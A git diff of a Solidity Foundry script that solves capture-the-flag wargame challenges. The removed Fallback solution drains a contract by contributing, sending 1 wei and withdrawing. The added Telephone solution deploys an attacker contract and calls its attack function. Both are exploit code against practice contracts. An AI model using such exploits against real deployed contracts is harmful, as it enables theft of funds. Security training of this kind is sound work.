@@ -3,11 +3,15 @@ pragma solidity =0.8.19;
 
 import {Script} from "@forge-std/Script.sol";
 
-import {Fallback} from "@main/1_Fallback.sol";
+import {Telephone} from "@main/4_Telephone.sol";
+import {TelephoneAttacker} from "@main/4_TelephoneAttacker.sol";
 
-contract SolveFallbackScript is Script {
 
-    Fallback fallbackChallenge = Fallback( payable(address(0x8464135c8F25Da09e49BC8782676a84730C318bC)) );
+contract SolveTelephoneScript is Script {
+
+    Telephone telephoneChallenge = Telephone( payable(address(0x8464135c8F25Da09e49BC8782676a84730C318bC)) );
+    TelephoneAttacker telephoneAttacker;
+
 
     function run() public {
         // uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
@@ -19,9 +23,8 @@ contract SolveFallbackScript is Script {
 
         vm.startBroadcast(attackerPrivateKey);
 
-        fallbackChallenge.contribute{value: 0.0005 ether}();
-        (bool success, ) = address(fallbackChallenge).call{value: 1 wei}("");
-        fallbackChallenge.withdraw();
+        telephoneAttacker = new TelephoneAttacker(address(telephoneChallenge));
+        telephoneAttacker.attack();
 
         vm.stopBroadcast();
     }
